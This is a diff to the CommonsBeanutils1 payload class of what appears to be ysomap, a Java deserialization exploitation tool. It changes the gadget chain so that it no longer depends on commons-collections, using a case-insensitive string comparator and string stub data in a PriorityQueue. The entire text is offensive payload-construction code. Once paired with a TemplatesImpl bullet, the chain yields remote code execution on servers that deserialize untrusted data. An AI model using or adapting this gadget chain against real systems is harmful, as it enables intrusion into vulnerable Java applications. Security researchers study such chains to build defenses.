@@ -10,7 +10,6 @@ import ysomap.core.bean.Payload;
 import ysomap.core.bullet.jdk.TemplatesImplBullet;
 import ysomap.core.util.ReflectionHelper;
 
-import java.math.BigInteger;
 import java.util.PriorityQueue;
 
 /**
@@ -31,13 +30,16 @@ public class CommonsBeanutils1 extends Payload<Object> {
 
     @Override
     public Object pack(Object obj) throws Exception {
-        final BeanComparator comparator = new BeanComparator("lowestSetBit");
+//        final BeanComparator comparator = new BeanComparator("lowestSetBit");
+        // case from https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
+        // remove beanutils' cc dependency
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
         String action = bullet.get("action");
         // create queue with numbers and basic comparator
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         // stub data for replacement later
-        queue.add(new BigInteger("1"));
-        queue.add(new BigInteger("1"));
+        queue.add("1");
+        queue.add("1");
 
         // switch method called by comparator
         ReflectionHelper.setFieldValue(comparator, "property", action);
